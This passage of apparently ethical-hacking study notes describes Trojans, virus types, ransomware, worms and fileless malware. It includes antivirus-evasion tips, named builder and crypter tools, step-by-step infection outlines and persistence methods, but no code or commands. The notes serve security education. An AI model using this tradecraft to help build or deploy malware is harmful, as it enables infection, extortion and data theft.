			- njRAT : njRAT is a remote access trojan (RAT) with robust data-stealing capabilities. It can log keystrokes, access a victim's camera, steal credentials stored in browsers, upload and download files, perform process and file manipulations, and view the victim's desktop. Additionally, this RAT can be used to control botnets (networks of compromised computers), enabling attackers to update, uninstall, disconnect, restart, and close the RAT, as well as rename its campaign ID.
		- Step 2: Employing a Dropper or Downloader:
			- After creating Trojans, attackers use droppers like Amadey or SecuriDropper, or downloaders like Downloader.DN, to deliver them to the victim’s machine. Droppers appear as legitimate files but execute hidden malware without saving it to disk, often using decoys like images or games. Downloaders, by contrast, contain links to retrieve the Trojan from an attacker’s server. While droppers evade firewalls, downloaders are more susceptible to detection using network analyzer tools.
			- Droppers : Droppers are programs designed to conceal malware payloads that disrupt target systems. They often include features to evade antivirus detection and perform stealthy installations. Droppers load their code into memory, extract the malware payload, write it to the file system, and then execute the payload to initiate the malware installation.
			- Droppers: Amadey, SecuriDropper, PindOS JavaScript dropper, SharkBot, Dropper.AIF, NullMixer
			- Downloaders : A downloader is a program designed to download and install harmful software, such as malware. Unlike droppers, downloaders do not carry malware themselves, which allows new or unknown downloaders to bypass anti-malware scanners. Attackers use downloaders as part of a payload or alongside other harmful programs to stealthily install malware. Downloaders are often disguised as legitimate files, such as "accounts.exe" or "invoices," and attached to emails.
			- Downloaders: Fruity Trojan downloader, Downloader.DN, InfoStealer.XY, sLoad
		- Step 3: Employing Wrapper:
			- Wrappers bind Trojan executables with legitimate-looking .EXE files, such as games or office software. When run, the Trojan installs in the background while the legitimate program runs in the foreground. Tools like petite.exe can compress and conceal Trojans, helping them bypass antivirus detection. Wrappers can also bundle multiple executables, with some running hidden processes alongside visible ones.
			- Covert Wrapper Programs - IExpress Wizard : The IExpress Wizard is a wrapper tool that helps users create self-extracting packages capable of automatically installing embedded files, including setup files or Trojans. IExpress can delete the setup files after execution, erasing traces of the Trojan. It can also run a program or extract hidden files. These embedded Trojans often evade detection by antivirus software.
			- Wrapper Tools: GuLoader, RDP Wrapper & Autoupdate, SystemBC, Trickbot, FinFisher
		- Step 4: Employ Crypter:
			- Attackers use a crypter, such as The Attacker-Crypter, to encrypt a Trojan and evade detection by firewalls and IDS. A crypter is software that encrypts the original binary code of an .exe file. It allows attackers to hide viruses, spyware, keyloggers, RATs, and other malicious software, making them undetectable by antivirus programs.
			- Attacker-Crypter : AttackerCrypter can encrypt executables to bypass traditional detection mechanisms using various techniques. It also allows attackers to execute custom PowerShell code or select the desired payload type through its interface. Additionally, it can notify the attacker of the methods being executed on the target system.
			- Crypter Tools: Muck Crypter, Pure Crypter, DarkTortilla, Line Crypter, Trickbot/Conti
		- Step 5: Propagating and Deploying Trojan:
			- After creating a Trojan and using a dropper/downloader, wrapper, and crypter, the attacker must transfer and deploy the package on the target machine. The Trojan can be propagated through various methods, including overt and covert channels, exploit kits, emails, USB drives, proxy servers, and instant messaging, tricking users into downloading and executing it. Once active, the Trojan can perform malicious actions, such as displaying annoying pop-ups, altering desktops, modifying or deleting files, stealing data, and creating backdoors.
			- Covert Channels Tools: Racoon , QEMU, ELECTRICFISH
			- Proxy Server Trojans: SocksEscort, QakBot, Stantinko Botnet
			- Propagate and Deploy Trojans: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
	- Techniques for Evading Antivirus Software:
		- Break the Trojan file into multiple parts and zip them into a single file.
		- Always create a custom Trojan and embed it into an application, as antivirus programs may fail to recognize new Trojans due to the absence of their signatures in the database.
		- Modify the Trojan's syntax:
			- Convert the .EXE file to a VBScript.
			- Rename the .EXE extension to .DOC.EXE, .PPT.EXE, or .PDF.EXE. Since Windows hides "known extensions" by default, these files will appear as .DOC, .PPT, or .PDF, disguising their true nature.
		- Modify the Trojan's content using a hex editor to alter its binary code, making it harder for antivirus programs to detect.
		- Alter the checksum and encrypt the file to prevent detection by antivirus software, as this changes the file's signature and makes it appear different.
		- Avoid using Trojans downloaded from the web, as antivirus software can easily detect these pre-existing versions.
		- Use binder and splitter tools to modify the first few bytes of Trojan programs, making them harder for antivirus software to detect.
		- Perform code obfuscation or morphing to disguise the Trojan's true functionality, making it harder for antivirus software to distinguish between malicious and harmless programs.
	- Exploit Kits:
		- An exploit kit, also known as a crimeware toolkit, is used to exploit security vulnerabilities in software applications, such as Adobe Reader and Adobe Flash Player. These kits distribute malware, including spyware, viruses, Trojans, worms, bots, backdoors, buffer overflow scripts, or other malicious payloads, to the target system. Exploit kits come with pre-written exploit code, making them easy to use even for attackers without advanced IT or security expertise. Additionally, they provide a user-friendly interface to track infection statistics and a remote mechanism to control compromised systems.
		- BotenaGo Exploit Kit : The BotenaGo exploit kit, written in the Go programming language, contains over 30 variants of exploits and is capable of attacking millions of IoT and routing devices worldwide. BotenaGo was first discovered in November 2021 and was initially detected as Mirai botnet malware by antivirus software. After successfully embedding a backdoor in a victim's device, attackers can exploit the device using preconfigured exploit functions in the source code.
	- Exploit Kits: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
- Viruses
	- A virus is a self-replicating program that creates copies of itself by attaching to another program, a computer's boot sector, or a document. Viruses are commonly transmitted through file downloads, infected disks or flash drives, and email attachments. Indications of a virus attack include frequent antivirus alerts, unusual hard drive activity, reduced storage space, and the appearance of unwanted pop-up windows.
	- Types of Viruses : Viruses are categorized based on their functionality and targets.
		- System or Boot Sector Virus:
			- The most common virus targets are system sectors, including the master boot record (MBR) and DOS boot sector, as these are critical during system booting. MBRs are especially vulnerable since their corruption can cause complete data loss. System sectors are only 512 bytes, so viruses hide their code elsewhere on the disk. Boot sector viruses, often spread via email attachments and USB drives, reside in memory and sometimes infect files, making them multipartite. These viruses move the MBR to a new location, placing their code in the original spot, ensuring their execution before the MBR during booting.
			- Virus Removal: System sector viruses often create the illusion that the system is virus-free. One way to address these viruses is to avoid using the Windows operating system and switch to Linux or macOS, as Windows is more susceptible to such attacks. Linux and macOS have built-in safeguards that offer better protection against these viruses. Another effective approach is to perform regular antivirus scans to detect and remove infections.
		- File Virus:
			- File viruses infect executable or interpreted files such as COM, EXE, SYS, OVL, OBJ, PRG, MNU, and BAT files. They can be either direct-action (non-resident) or memory-resident. File viruses insert their code into executable files, typically targeting those with extensions like .COM or .EXE. When the infected program runs, the virus executes alongside it, spreading to other files.
			- These viruses are challenging to remove because overwriting them renders the original program unusable. Some file viruses save the program's original instructions, allowing it to execute normally and concealing the infection. Using stealth techniques, they hide in memory and prevent detection, showing no file length increase during directory listings. They can also intercept file read requests, returning the original file to the user to avoid suspicion. File viruses are versatile and capable of infecting many file types due to the variety of infection techniques available.
		- Multipartite Virus:
			- A multipartite virus, also known as a multipart or hybrid virus, combines the characteristics of file infectors and boot record infectors, targeting both the boot sector and executable files simultaneously. When the virus infects the boot sector, it can spread to system files, and infected system files can, in turn, reinfect the boot sector. This type of virus repeatedly reinfects the system if it is not completely eradicated.
		- Macro Virus:
			- Macro viruses infect applications like Microsoft Word by automatically executing actions when triggered. Most are written in Visual Basic for Applications (VBA) and target templates or convert infected documents into template files, disguising themselves as regular documents
			- Although generally less harmful than other viruses, macro viruses often spread via email. Pure data files cannot spread viruses, but users may overlook the distinction between data and executable files due to the extensive use of macro languages in programs. This blurring occurs when default macros are set to run automatically upon loading a file, creating an opportunity for exploitation. Virus writers target universal programs with macro capabilities, such as Microsoft Word, Excel, and other Office applications, as well as Windows Help files, which can also contain macro code.
		- Cluster Virus:
			- Cluster viruses infect files without altering them or creating additional files. They store their code on the hard drive and overwrite directory entry pointers, redirecting the disk read process to the virus code instead of the intended program. Although this modification affects all programs, only one copy of the virus exists on the disk.
			- A cluster virus, such as Dir-2, executes itself when any program is launched, then passes control to the actual program. If the virus infects memory, it manipulates access to the disk's directory structure. Booting from a clean USB drive and running utilities like CHKDSK can reveal issues, such as cross-linked files. Accepting the utility's offer to "fix" these problems can cause the virus to spread, infecting all executable files, leading to data loss or uniform file sizes.
		- Stealth/Tunneling Virus:
			- Stealth viruses evade antivirus detection by altering service call interrupts and replacing system requests with their own code. They provide false information to conceal their presence, hiding modifications and taking control of system functions. For example, they can hide file size changes or temporarily relocate a copy of themselves to another drive, replacing the infected file with an uninfected one.
			- These viruses also reside in memory and control system functions that read files or sectors. When a program requests modified information, the virus provides false data to the requesting program. Rootkits, often carriers of stealth viruses, are installed by Trojans and allow the virus to hide and persist undetected.
			- Virus Removal:
				- Always perform a cold boot (boot from a write-protected USB).
				- Avoid using DOS commands like FDISK to fix the virus.
				- Use antivirus software for detection and removal.
		- Encryption Virus:
			- Encryption viruses, or cryptolocker viruses, infiltrate systems via freeware, shareware, torrents, fake ads, email spam, and more. These viruses consist of an encrypted copy and a decryption module, with the decryption module remaining constant while the encryption uses different keys.
			- When the virus is injected into the system, the decryption module executes first, decrypting the virus body, which then replicates or becomes resident on the machine. Each infected file is encrypted with a unique key using XOR with a randomized key. These viruses block access to the system or limit functionality, using encryption to evade detection by virus scanners. While virus scanners can't detect the encrypted virus via signatures, they can identify the decryption module.
		- Sparse Infector Virus:
			- Sparse infector viruses spread infection by minimizing their chance of detection. These viruses infect infrequently, only under specific conditions or when file sizes fall within a certain range.
			- The sparse infector virus operates in two ways:
				- It replicates occasionally (e.g., every tenth program executed or on a specific day of the week).
				- It selects files to infect based on set conditions (e.g., infecting files under 128 KB in size).
			- For example, an attacker may send a sparse infector virus to a target machine, setting it to execute on the 15th day of every month. This tactic reduces the likelihood of detection by antivirus software, allowing the virus to infect the system successfully.
		- Polymorphic Virus:
			- Polymorphic viruses encrypt their code and use a decryption module to decode it during infection. To avoid detection, these viruses modify their code each time they replicate by altering both the encryption module and the instruction sequence. Random number generators drive this process.
			- A polymorphic virus consists of three components: the encrypted virus code, the decryptor routine, and the mutation engine. The decryptor routine decrypts the virus code after gaining control of the system, while the mutation engine generates random decryption routines that change with each infection.
			- When a program infected with a polymorphic virus is executed, the decryptor takes control, decrypting the virus code and mutation engine. The virus then replicates in RAM and generates new, randomized decryption routines for further infections. This encryption and mutation process makes polymorphic viruses difficult to detect, as no two infections appear the same to antivirus software.
		- Metamorphic Virus:
			- Metamorphic viruses are designed to completely rewrite themselves each time they infect a new executable file. These sophisticated viruses use metamorphic engines to reprogram their code, translating it into a temporary variant before converting it back to the original code. This technique maintains the original algorithm while avoiding detection by antivirus software through pattern recognition. Metamorphic viruses are more advanced and effective than polymorphic viruses.
			- The transformation of virus bodies depends on the technique employed, with methods for metamorphosing viruses:
				- Disassembler
				- Expander
				- Permutator
				- Assembler
			- Virus bodies are transformed through the following steps:
				- Inserts dead code
				- Reshapes expressions
				- Reorders instructions
				- Modifies variable names
				- Encrypts program code
				- Modifies program control structure
		- Overwriting File or Cavity Virus:
			- Some programs contain empty spaces. Cavity viruses, also known as space fillers, overwrite part of the host file with a constant value (usually nulls) without increasing the file size, thus preserving its functionality. By maintaining a constant file size during infection, the virus can evade detection. Cavity viruses are rarely encountered due to the limited availability of suitable hosts and the complexity of their code.
			- A new design for Windows files, called the Portable Executable (PE) format, improves program loading speeds. However, it creates a gap in the file during execution, which cavity viruses can exploit to insert themselves.
		- Companion Virus/Camouflage Virus:
			- The companion virus stores itself with the same filename as the target program file. It infects the computer when the file is executed and modifies the hard disk data. Companion viruses use DOS to run COM files before EXE files. The virus installs an identical COM file and infects EXE files.
			- Here’s how it works: Suppose a companion virus is running on the PC and decides to infect a file. It looks around and finds a file called notepad.exe. It then creates a file called notepad.com, which contains the virus. The virus typically places this file in the same directory as the .exe file, although it can also place it in any directory on the DOS path. When typing "notepad" and pressing Enter, DOS executes notepad.com instead of notepad.exe (DOS executes COM files first, followed by EXE, then BAT files with the same root name if they are in the same directory).
			- The virus runs, potentially infecting more files, before finally loading and executing notepad.exe. The user is likely to fail to notice any issues. A companion virus can be easily detected by the presence of the extra COM file in the system.
		- Shell Virus:
			- The shell virus code forms a shell around the target host program’s code, making itself the original program and treating the host code as a subroutine. Nearly all boot sector viruses are shell viruses.
		- File Extension Virus:
			- File extension viruses alter the extensions of files. The .TXT extension is typically safe, as it indicates a plain text file. However, with extensions hidden, a file named BAD.TXT.VBS would appear as BAD.TXT. If one forgot that extensions were turned off, one might mistakenly think it’s a text file and open it. In reality, it is an executable Visual Basic Script virus file that could cause severe damage.
			- The guidelines to secure files against virus infections:
				- Turn off "Hide file extensions" in Windows (Go to Control Panel -> Appearance and Personalization -> Show hidden files and folders -> View tab -> Uncheck "Hide extensions for known file types").
				- Scan all files on the system using reliable antivirus software, as this may take a considerable amount of time.
		- FAT Virus:
			- A FAT virus targets the File Allocation Table (FAT), a system used in Microsoft and other computer systems to access stored information. By attacking the FAT, the virus can cause severe damage. It may embed itself in files, trigger when the FAT accesses them, or directly attack the FAT. These viruses often overwrite files or directories, leading to permanent data loss.
			- A powerful FAT virus can render a computer unusable, requiring reformatting. It destroys the index, making file location impossible, and can spread by corrupting files as the FAT accesses them. Symptoms include missing or inaccessible files and changes to the FAT architecture, such as a shift from FAT32 to FAT12.
		- Logic Bomb Virus:
			- A logic bomb is a virus triggered by a specific event, such as launching an application or reaching a particular date/time, using logic to execute the trigger.
			- When a logic bomb is programmed to activate on a specific date, it is known as a time bomb. Time bombs are typically set to trigger on significant dates.
			- For example, cybercriminals may use spyware to secretly install a keylogger on a computer. The keylogger captures keystrokes, including usernames and passwords. The logic bomb is set to activate when visiting a site that requires login credentials, like a banking site or social network. Once triggered, the logic bomb executes the keylogger, captures credentials, and sends them to a remote attacker.
		- Web Scripting Virus:
			- A web scripting virus is a type of security vulnerability that breaches web browser security through a website, allowing attackers to inject client-side scripts into web pages. This can bypass access controls and steal information from the browser. Web scripting viruses typically target sites with large user bases, such as social networking, user review, and email sites, and can spread faster than other types of viruses. A common example is DDoS, which can send spam, damage data, and defraud users.
			- There are two types of web scripting viruses: non-persistent and persistent. Non-persistent viruses attack without knowledge, while persistent viruses steal cookies and hijack sessions, enabling attackers to impersonate and cause significant damage.
			- Prevention : To prevent these viruses and exploits, safely validate untrusted HTML inputs, enforce cookie security, disable scripts, and use antivirus programs with real-time protection for web browsers. Avoid unknown websites and use World of Trust to verify site safety. Signs of a web scripting virus include redirected searches, changes to the homepage or background, slow performance, and random program closures. Modern browsers offer add-ons like Adblock Plus to block scripts.
		- Email Virus:
			- An email virus is malicious code sent as an email attachment that, when activated, can damage files, steal data, or spread by emailing itself to contacts. These viruses can create pop-ups, crash systems, or steal personal information. They may appear as emails from unknown senders, have nonsensical subject lines, or be disguised to look like messages from trusted sources.
			- To avoid email virus attacks, avoid opening attachments unless the sender and content are verified. Use antivirus software to scan attachments before opening.
		- Armored Virus:
			- Armored viruses are designed to evade detection by confusing or deceiving antivirus systems, making it difficult to identify the source of the infection. These viruses mislead antivirus programs by masking their true location, often appearing to be elsewhere while residing on the system itself.
			- The following basic techniques are employed by armored viruses:
				- Anti-disassembly : This technique uses specially crafted code or data to generate incorrect program listings in disassembly analysis tools.
				- Anti-debugging : These techniques ensure the program is not running under a debugger, slowing reverse engineering without fully preventing it.
				- Anti-heuristics : These methods modify machine code to resist heuristic analysis, protecting the program from programmer and debugger intervention.
				- Anti-emulation : These techniques fingerprint the emulated system environment to avoid dynamic analysis and protect intellectual property from emulation-assisted reverse engineering.
		- Add-on Virus:
			- Add-on viruses either append their code to the host code without altering it or relocate the host code to insert their own code at the beginning.
		- Intrusive Virus:
			- Intrusive viruses overwrite the host code, either partially or entirely, with their own code.
		- Direct Action or Transient Virus:
			- Direct action or transient viruses transfer control from the host code to the virus code in memory. These viruses select target programs to modify and corrupt them. Their lifespan depends on the lifespan of their host, as they execute only when the attached program runs and terminate when the program ends. During execution, the virus may spread to other programs. These viruses are called transient or direct because they operate for a short period and directly access the disk to search for programs to infect.	
		- Terminate and Stay Resident Virus (TSR):
			- A terminate-and-stay-resident (TSR) virus remains in the target machine’s memory throughout the entire session, even after the host program has executed and terminated. By staying in memory, the TSR virus retains some control over system processes. Typically, it incorporates interrupt vectors into its code, redirecting execution to the virus when an interrupt occurs. To completely remove a TSR virus from the system, a reboot is required, as it leaves no trace in memory after the system restarts.
			- The following steps are used by TSR viruses to infect files:
				- Gain control of the system.
				- Allocate a portion of memory for their code.
				- Transfer and activate themselves in the allocated memory.
				- Hook the code execution flow to their own code.
				- Replicate and infect files.
	- Infect Systems Using Virus:
		- Step 1: Create a virus using tools such as JPS Virus Maker, Virus Maker, or Virus-Builder. These tools enable customization and crafting of a virus into a single executable file. The behavior of the virus depends on the options provided by the virus maker tool.
		- Step 2: Once the virus is created, it can be packed using a binder or virus packager tool.
		- Step 3: Send it to the victim's machine via email, chat, a mapped network drive, or another method that appears legitimate to the victim.
		- Step 4: When the victim opens and executes the received file, which appears legitimate, the target system becomes infected.
	- Virus Maker Tools: JPS Virus Maker, TeraBIT Virus Maker, Batch Virus Generator
	- Propagating and Deploying Virus:
		- Virus Hoaxes:
			- Techniques such as virus hoaxes and fake antivirus software are commonly used by attackers to introduce viruses into victims' systems. Virus hoaxes can be nearly as damaging as real viruses, causing significant loss of productivity and bandwidth as naive users react to them and forward them to others. Due to the fear viruses often create, they have become a frequent subject of hoaxes. Virus hoaxes are false alarms that claim to report nonexistent viruses.
			- The following are key features of virus hoaxes:
				- These warning messages, which spread quickly, claim that a specific email should not be opened, as doing so would damage the system.
				- In some cases, these warning messages themselves contain virus attachments.
			- Verify the identity of the person posting the warning and check for technical details in virus-related messages. Cross-check information from suspicious newsgroups or unfamiliar sources. If the message comes from a government body, ensure it references the relevant federal regulation. These steps help ensure the information's reliability.
			- Google Critical Security Alert Scam:
				- Google Critical Security Alert is a service provided by Google to notify users of any activity related to their accounts, such as logging in, changing passwords, or updating personal information. Attackers create fake alert emails to deceive victims, claiming these activities have occurred. When users view the fake alert and click the link provided, they can become infected.
				- The example shows a hoax email with the subject "New device signed in to." If the victim overlooks the email's source and clicks the "Check activity" button, they fall into the trap.
			- Additional Virus Hoaxes: WhatsApp Seismic Waves Card, McAfee Virus Pop-Up Scam, McAfee Scam - Sinister Email
		- Fake Antivirus:
			- Fake antivirus software is a type of internet fraud that mimics legitimate antivirus programs. It often appears in banner ads, pop-ups, email links, and search results. These programs encourage users to install them, perform updates, or remove viruses, but once clicked, they redirect users to a page prompting payment details.-
			- Once installed, fake antivirus software can steal sensitive information, corrupt files, and spread malware. Recently, fake antivirus apps have become widespread in the mobile space, with two-thirds of antivirus apps in the Android Play Store identified as fake, according to AV-Comparatives research.
			- Antivirus 10 : Antivirus 10 is fake antivirus software that pretends to be a legitimate antivirus suite. It is distributed as a potentially unwanted program (PUP) alongside regular software applications. Antivirus 10 initially imitates a system scan and displays fake threats found on the system. It generates fake system warnings, firewall alerts, unwanted redirects to malicious websites, and antivirus pop-ups, urging users to purchase the full version.
			- Additional Fake Antivirus Programs: AVLab Internet Security, Smart Security, PC Analyzer Tool, Live Protection Suite
- Ransomware
	- Ransomware is a type of malware that restricts access to a computer system's files and folders, demanding an online ransom payment from the victim to the malware creator(s) in exchange for removing the restrictions. Ransomware may encrypt files on the system's hard drive or simply lock the system and display messages designed to trick the user into paying the ransom.
	- In a web browser, a text file or webpage displays the ransomware's demands. The messages often appear to be from companies or law enforcement personnel, falsely claiming that the victim's system is being used for illegal purposes or contains illegal content (e.g., pornographic videos, pirated software). Alternatively, the message may be a fake Microsoft product activation notice, falsely claiming that the installed Office software is counterfeit and requires reactivation. These messages aim to trick victims into paying money to undo the restrictions imposed on their systems. Ransomware exploits victims' fear, trust, surprise, and embarrassment to coerce them into paying the ransom.
	- Mallox Ransomware:
		- Mallox is a ransomware strain targeting Microsoft Windows systems, first identified in June 2021. It infects networks with vulnerable MS-SQL servers and spreads through emails, software cracking tools, and downloads from untrusted sites. Mallox encrypts files on the infected system, appending the “.mallox” extension (e.g., "sample.txt" becomes "sample.txt.mallox"). Some variants use extensions like “.malox,” “.malloxx,” or “.maloxx.” It also creates a ransom note, “RECOVERY INFORMATION.txt,” with instructions for contacting the attacker. Victims are directed to the Mallox ransomware TOR website via the Tor Browser to pay the ransom.
	- STOP/Djvu Ransomware :
		- The STOP/DJVU ransomware, first identified in February 2018, has since evolved into over 600 variants. It earned the "Djvu" nickname by adding the .djvu extension, a legitimate file format used by AT&T. This variant uses RSA encryption and multiple layers of obfuscation, hindering analysis. Primarily targeting Windows systems, STOP/DJVU downloads additional programs to encrypt files, with variants using extensions like .looy, .vook, .kool, and others. After encryption, a "_readme.txt" file appears with ransom instructions. It spreads mainly through spam emails with malicious attachments and fake file types on torrent sites.
	- Additional Ransomware: ESXiArgs, Qilin, Akira, Royal, NoEscape, CatB, Dodge Ransomware, Rhysida, BianLian, BlackCat
	- Ransomware Families: Mallox, Phobos, Xorist, LockBit Black, DarkSide RaaS, Conti, Cerber, Thanos, RansomEXX, NETWALKER, QNAPCrypt, Maze
	- Infect Systems Using Ransomware:
		- Step 1: Create ransomware using tools such as Chaos Ransomware Builder v4.
		- Step 2: Transfer the ransomware to the victim’s machine using various techniques, such as attaching it to an email or through physical means, such as a hard drive or USB drive, making it appear legitimate.
		- Step 3: When the victim downloads and opens the malicious file, the ransomware infects the system by encrypting system files based on the number of files and the encryption algorithm.
		- Step 4: After the infection, a window appears instructing the victim to pay a ransom to decrypt the files.
- Computer Worms
	- Computer worms are malicious programs that independently replicate, execute, and spread across network connections, consuming available computing resources without human interaction.
	- Worms are a subtype of viruses. A worm does not require a host to replicate; however, in some cases, the worm's payload may infect the host machine as well. Attackers use worm payloads to install backdoors on infected computers, turning them into zombies and creating a botnet. These botnets can then be used to perform further cyberattacks.
	- Computer Worms: SSH-Snake, Raspberry Robin, P2PInfect
	- Infect Systems Using Worm:
		- Step 1: Create a worm using tools such as Internet Worm Maker Thing or Batch Worm Generator. Write the code with specific features designed to exploit vulnerabilities in system software or network protocols.
		- Step 2: Deploy the worm via phishing emails, malicious websites, network shares, or infected USB drives. The worm is attached to a file or link that appears legitimate to users. Use specific packers and crypters, such as BitCrypter or H-Crypt, to encrypt the worm and evade detection by security solutions.
		- Step 3: Once the user clicks on the phishing link or downloads a file from a malicious website/USB, the worm infects the system by executing its payload, typically using exploit code and an automated script to execute upon download.
		- Step 4: After infection, the worm scans for other vulnerable devices on the network without human intervention. It uses various methods, such as scanning for open ports or known vulnerabilities, to identify targets.
		- Step 5: The worm copies itself to identified vulnerable devices, propagating its infection and continuing the cycle.
		- Step 6: The worm installs backdoors or alters system settings to remain active, continuously stealing and exfiltrating data from the infected devices.
	- Worm Maker - Internet Worm Maker Thing:
		- Internet Worm Maker Thing is an open-source tool used to create worms that can infect a victim's drives and files, display messages, disable antivirus software, and more. This tool includes a compiler that can easily convert a batch virus into an executable to evade antivirus software or serve other purposes.
	- Worm Makers: Batch Worm Generator
- Fileless Malware
	- Fileless malware, also known as non-malware, compromises legitimate software, applications, and system protocols to carry out malicious activities. It exploits existing vulnerabilities to infiltrate the system and resides in the system’s RAM. This type of malware injects malicious code into active processes such as Microsoft Word, Flash, Adobe PDF Reader, JavaScript, and PowerShell.
	- Fileless malware does not rely on files and leaves no traces, making it difficult to detect and remove with traditional anti-malware solutions. As a result, this type of malware is highly resistant to computer forensic techniques. It primarily resides in volatile memory locations, such as running processes, the system registry, and service areas.
	- The primary reasons for using fileless malware:
		- Stealth : Fileless malware exploits legitimate system tools, making it extremely difficult to detect, block, or prevent such attacks.
		- Living-off-the-land (LOL): Fileless malware takes advantage of system tools that are already installed by default. This eliminates the need for attackers to create or install custom tools on the target system.
		- Trustworthiness: The system tools leveraged by fileless malware are frequently used and trusted, leading security tools to incorrectly assume that these tools are running for legitimate purposes.
		- Persistence without files: Despite not storing files on disk, fileless malware can achieve persistence by inserting malicious code into the registry or scheduling tasks. This allows the malware to remain active even after a system reboot, without leaving behind traditional forensic evidence.
		- Simplified infection process: Fileless attacks can originate from something as simple as a phishing email leading to a malicious website. The website exploits browser vulnerabilities to execute code directly in memory, streamlining the initial infection vector and bypassing the need to trick users into downloading or executing files.
		- Increased success rate in targeted attacks: The stealthy nature of fileless malware makes it highly effective in targeted attacks, such as espionage and sophisticated cyber-espionage campaigns. It enables attackers to maintain a low profile while exploring the target environment and moving laterally across the network.
		- Challenges in forensic analysis and incident response: The transient nature of fileless malware complicates forensic analysis and incident response. With no files to analyze and memory contents often lost upon system reboot, it becomes more difficult for security teams to determine the scope of an attack and develop indicators of compromise (IoCs) for future defenses.
	- Fileless Propagation Techniques used by Attackers:
		- Phishing emails: Used to deliver malicious links or attachments that execute fileless attacks in memory.
		- Exploitation of legitimate applications: Leveraging trusted applications like Microsoft Word and JavaScript to execute malicious code.
		- Native applications: Utilizing built-in tools such as PowerShell and Windows Management Instrumentation (WMI) to execute attacks.
		- Infection through lateral movement: Spreading malware across the network by exploiting infected systems.
		- Malicious websites: Creating fraudulent websites that exploit browser or plugin vulnerabilities to execute malicious code in memory.
		- Registry manipulation: Modifying the Windows registry to bypass User Account Control (UAC), application whitelisting, or other running processes to maintain persistence.
		- Memory code injection: Injecting code directly into memory to evade standard security measures, including local shellcode injection, remote thread injection, and process hollowing.
		- Script-based injection: Using scripts, such as PowerShell or JavaScript, to execute malicious activities without leaving file traces.
		- Reflective DLL injection: Loading dynamic link libraries (DLLs) directly into memory without writing them to disk.
		- Exploiting non-malicious files: Leveraging seemingly harmless files, such as PDFs or Windows shortcut files (.lnk), to initiate attacks.
	- Taxonomy of Fileless Malware Threats:
		- Fileless malware can be categorized based on its point of entry, which refers to how it gains access to the target system. It can infiltrate the system through exploits, compromised hardware, or the normal execution of applications or scripts.
		- According to the above categorization, fileless malware threats can be classified into three types based on the amount of evidence they leave on the victim’s machine:
			- Type 1: No File Activity Performed
				- This type of malware never writes files to disk. For example, malicious packets may exploit a vulnerability to install a backdoor in kernel memory, or malware may be embedded in the device’s firmware. Since anti-malware solutions cannot scan firmware, these threats are difficult to detect and prevent.
			- Type 2: Indirect File Activity
				- This type of malware achieves a fileless presence on the target machine through the use of files. For example, an attacker may inject a malicious PowerShell command into the WMI repository to configure a filter that executes periodically.
			- Type 3: Required Files to Operate
				- This type of malware requires files to operate but does not execute attacks directly from them. For example, an attacker may exploit a document with an embedded macro, Java/Flash file, or EXE file to inject a malicious payload into the target host, then maintain persistence without relying on any files.
		- Classification of fileless malware threats based on their point of entry:
			- Exploits : Exploits can be either file-based or network-based. File-based malware targets system executables, Flash, Java, documents, etc., to run shellcode that injects a malicious payload into memory. This type of malware uses files to gain initial access to the target machine. Network-based malware, on the other hand, exploits vulnerabilities in network communication protocols, such as SMB, to deliver malicious payloads.
			- Hardware : Device-based malware infects firmware on network cards and hard disks to deliver a malicious payload. CPU-based malware exploits firmware used for management operations to execute malicious code within the CPU. USB-based malware rewrites USB firmware with malicious code that directly interacts with the operating system and installs a malicious payload on the target machine. Similarly, fileless malware can exploit BIOS-based firmware or conduct hypervisor-based attacks that target virtual machines.
			- Execution and Injection : This malware can be file-based, macro-based, script-based, or disk-based. File-based malware exploits executables, DLLs, LNK files, etc., to inject a malicious payload into memory or running processes. Macro-based malware tricks victims into clicking malicious links that execute payloads via macros. Script-based malware is used once an attacker gains a foothold, injecting payloads by running scripts on the command prompt. Disk-based malware rewrites the boot record with malicious code to gain access and install the payload.
	- Fileless Malware Works:
		- Point of Entry:
			- Memory Exploits: Fileless malware uses various techniques to inject and execute itself in the process memory of legitimate system processes. It exploits the memory and privileges of whitelisted system tools, such as Windows Management Instrumentation (WMI), PowerShell, Command.exe, PsExec, etc.
			- Malicious Websites:
				- Fileless threats can originate from exploit-hosting websites that appear legitimate. Upon visiting, the exploit kit scans for vulnerabilities like outdated Flash or Java plugins. If successful, it uses native tools like PowerShell to download and execute the payload directly in memory, without writing files to disk.
				- Fileless malware can also exploit script-based programs, such as PowerShell, macros, JavaScript, and VBScript. These scripts may inject code or connect to malicious sites to download additional binaries or scripts, delivering the actual payload.
			- Phishing Emails/Malicious Documents: Attackers may embed malicious macros, such as VBScript or JavaScript, in Microsoft Office documents (Word, PowerPoint, Excel) or PDFs and use social engineering techniques to trick users into enabling the macros. While the attack begins with a document or file, it becomes a fileless threat once the malicious script executes from memory using whitelisted tools like PowerShell.
		- Code Execution:
			- Code Injection: Fileless threats employ techniques like process hollowing and reflective DLL injection to load shellcode directly into memory without writing any files to disk.
			- Script-based Injection: Fileless malware often arrives as an email attachment. When opened, the embedded script runs in memory, invoking whitelisted applications like PowerShell, mshta.exe, JavaScript, WScript, or VBScript to connect to malicious websites and download additional scripts for payload delivery. Since these operations occur entirely in memory, traditional anti-malware solutions struggle to detect them.
		- Persistence:
			- Fileless malware is typically non-persistent, as it resides in memory and is removed upon system restart. However, attackers can achieve persistence by storing malicious scripts in built-in Windows tools like the registry, WMI, or Task Scheduler, enabling them to execute even after a reboot.
			- Windows Registry: Attackers can store malicious scripts in Windows AutoStart registry keys, ensuring they are loaded and executed every time the system restarts.
			- Windows Management Instrumentation (WMI): Fileless malware exploits WMI, a tool commonly used for automating system administration tasks, to achieve and maintain persistence. Attackers store malicious scripts in WMI repositories, which are periodically triggered through WMI bindings.
			- Windows Task Scheduler: Attackers can use the Task Scheduler to configure malicious scripts to execute automatically at specified intervals.
		- Achieving Objectives:
			- By maintaining persistence, attackers can bypass security solutions and accomplish various objectives, including data exfiltration, credential theft, reconnaissance, and cyber espionage on target systems and networks.
	- Launching Fileless Malware:
		- Launching Fileless Malware through Document Exploits:
			- An attacker can deceive users into downloading malicious documents, archives, PDFs, or other enticing files containing macro code through phishing emails or social engineering. Once opened, the macro triggers VBA or JavaScript, exploiting Windows tools like PowerShell. The script then uses PowerShell to run additional code or payloads, furthering the infection without detection.
			- The script may access local storage to execute malicious files or run the payload in memory. Once executed, the payload disguises itself as a legitimate dropper or downloader, enabling further attacks.
